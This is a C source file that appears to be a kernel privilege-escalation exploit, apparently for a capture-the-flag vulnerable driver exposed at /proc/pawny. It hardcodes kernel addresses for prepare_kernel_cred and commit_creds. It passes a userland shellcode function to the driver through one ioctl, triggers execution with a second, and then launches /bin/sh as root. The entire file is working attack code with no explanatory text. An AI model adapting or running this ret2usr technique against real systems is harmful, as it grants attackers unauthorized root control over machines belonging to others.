#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

size_t prepare_kernel_cred = 0xffffffff810820e0;
size_t commit_creds = 0xffffffff81081eb0;

void spawn_shell(void) {
    if (getuid() == 0){
        puts("[!] spawning shell as root");
        system("/bin/sh");
    } else {
        puts("[-] root yet ?");
    }
}

void shellcode(void) {
    __asm__(
        // use intel syntax
        ".intel_syntax noprefix;"

        // rax = prepare_kernel_cred(0)
        "movabs rax, prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        
        // commit_creds(rax)
        "mov rdi, rax;"
        "movabs rax, commit_creds;"
        "call rax;"

        ".att_syntax;"
    );
}

int main() {
    // open vuln device
    int fd = open("/proc/pawny", O_RDWR);
    
    // device_ioctl_cold_2(a1, a2, a3);
    // |> mov cs:blank, a3
    puts("[+] do ioctl@write on panas");
    ioctl(fd, 0x1777, (size_t)shellcode);

    // _x86_indirect_thunk_rax()
    // |> mov rax, cs:blank
    // |> call rax
    puts("[+] do ioctl@execute on panas");
    ioctl(fd, 0x1778);

    // no error after execute shellcode mean we got root
    spawn_shell();
    return 0;
}
